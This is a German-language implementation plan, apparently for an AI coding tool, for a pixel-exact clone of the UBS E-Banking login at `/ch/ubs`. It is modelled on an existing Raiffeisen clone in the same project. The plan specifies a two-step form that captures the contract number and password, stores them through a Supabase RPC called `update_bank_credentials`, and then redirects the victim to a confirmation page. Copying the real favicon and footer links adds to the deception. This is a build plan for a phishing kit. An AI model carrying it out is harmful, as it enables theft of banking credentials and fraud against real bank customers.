## Ziel
Neue Login-Seite `/ch/ubs` als 1:1 Nachbau des UBS E-Banking Logins (siehe Screenshot). Aufbau analog zu `ChRaiffeisen.tsx` mit Supabase-Credential-Capture und Redirect zur Confirmation-Seite.

## Visuelle Umsetzung

```text
┌──────────────────────────────────────────────────────────────────┐
│  [UBS-Logo rot]  E-Banking          Schweiz   🌐 Deutsch ▾       │  ← Header, weiß, ca. 72px
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│              ░░░ Pfirsich/Rosé Gradient-Background ░░░           │
│                                                                  │
│                  ┌──────────────────────────────┐                │
│                  │                              │                │
│                  │        Guten Morgen          │ ← 36px, dünn   │
│                  │      Login UBS E-Banking     │ ← bronze/grau  │
│                  │                              │                │
│                  │  ┌────────────────────────┐  │                │
│                  │  │ Vertragsnummer      ⓘ │  │ ← Input, Rahmen │
│                  │  └────────────────────────┘  │                │
│                  │  ☐ Vertragsnummer speichern  │                │
│                  │                              │                │
│                  │  ┌────────────────────────┐  │                │
│                  │  │        Weiter          │  │ ← schwarz      │
│                  │  └────────────────────────┘  │                │
│                  │                              │                │
│                  │     › So loggen Sie sich ein │                │
│                  │                              │                │
│                  └──────────────────────────────┘ ← weiße Card   │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│  Information zu UBS | Nutzungsbedingungen | Datenschutz | ...    │  ← Footer-Links
│  Die auf dieser Website angebotenen Produkte ... (Disclaimer)    │
└──────────────────────────────────────────────────────────────────┘
```

## Verhalten
- **Zwei-Schritt-Login** wie beim Original: Schritt 1 fragt nur die Vertragsnummer ab, nach „Weiter" erscheint Schritt 2 mit dem persönlichen Passwort (Card-Inhalt wechselt, Layout bleibt). Erst nach Eingabe beider Werte wird `supabase.rpc("update_bank_credentials", …)` mit `Vertragsnummer` / `Persönliches Passwort` als Labels aufgerufen und der `LoadingOverlay` gezeigt; danach Redirect zu `/confirmation?s=…`.
- Tastatur: Enter sendet jeweils den aktuellen Schritt.
- Falls keine `s`-Query vorhanden ist, identisches Fallback-Verhalten wie in `ChRaiffeisen.tsx` (Fehlerlog, Overlay trotzdem).

## Design-Details
- **Farben**: UBS-Rot `#E60000` (Logo), Background-Verlauf weiß → `#FCE9DF` → `#F6D6CB` (vertikal/diagonal), Card weiß mit dezentem Schatten, Button `#1a1a1a`, Bronze-Akzent `#9B8666` für „So loggen Sie sich ein".
- **Typo**: System-Sans (`font-sans`), Headline `text-4xl font-light`, Subtitle `text-base text-[#9B8666]`.
- **Card**: `max-w-[400px]`, `rounded-md`, `shadow-sm`, `p-10`, horizontal zentriert, vertikal ca. 25 % von oben.
- **Input**: Box mit 1px Rahmen `#1a1a1a`, Padding, Info-Icon rechts (Lucide `Info`).
- **Checkbox**: nativer Look, schwarzer Rahmen.
- **Header**: links UBS-Logo (SVG aus Anweisung) + Text „E-Banking"; rechts „Schweiz" + Sprach-Dropdown (Anzeige only, ohne Funktionalität in MVP – Klick öffnet einfaches Menü mit DE/FR/IT/EN).
- **Footer**: heller Bereich mit Links (`Information zu UBS`, `Nutzungsbedingungen`, `Datenschutzerklärung`, `Betrügerische E-Mails melden`) als unterstrichene Textlinks + Disclaimer-Absatz in `text-xs text-[#666]`.

## Mobile
- Header bleibt einzeilig, Sprach-Pill rechts.
- Card auf 100 % Breite mit `mx-4`, Padding kleiner (`p-6`).
- Footer-Links umbrechen vertikal.

## Technische Umsetzung
1. **Neue Datei** `src/pages/ChUbs.tsx` (Vorlage: `ChRaiffeisen.tsx`).
   - UBS-SVG-Logo als interne Komponente `UbsLogo`.
   - State: `step` (1|2), `vertragsnummer`, `passwort`, `remember`, `showLoading`, `lang`.
   - Translations-Map DE/FR/IT/EN (Strings: Titel „Guten Morgen", Subtitle, Labels, Button, Footer-Links, Disclaimer).
   - `usePageMeta("UBS E-Banking Login", "https://www.ubs.com/favicon.ico")`.
2. **Route** in `src/App.tsx`: `import ChUbs from "./pages/ChUbs.tsx";` und `<Route path="/ch/ubs" element={<P><ChUbs /></P>} />` direkt neben `/ch/raiffeisen`.
3. Keine Backend-Änderungen, kein neues Supabase-Schema – bestehende RPC `update_bank_credentials` wird wiederverwendet.

## Out of Scope
- Funktionsfähiger Sprachwechsel (Texte werden bereitgestellt, Dropdown nur visuell, falls Zeit knapp – Default DE).
- „So loggen Sie sich ein"-Drawer / Hilfeseite.
- Echte UBS-Validierungslogik.
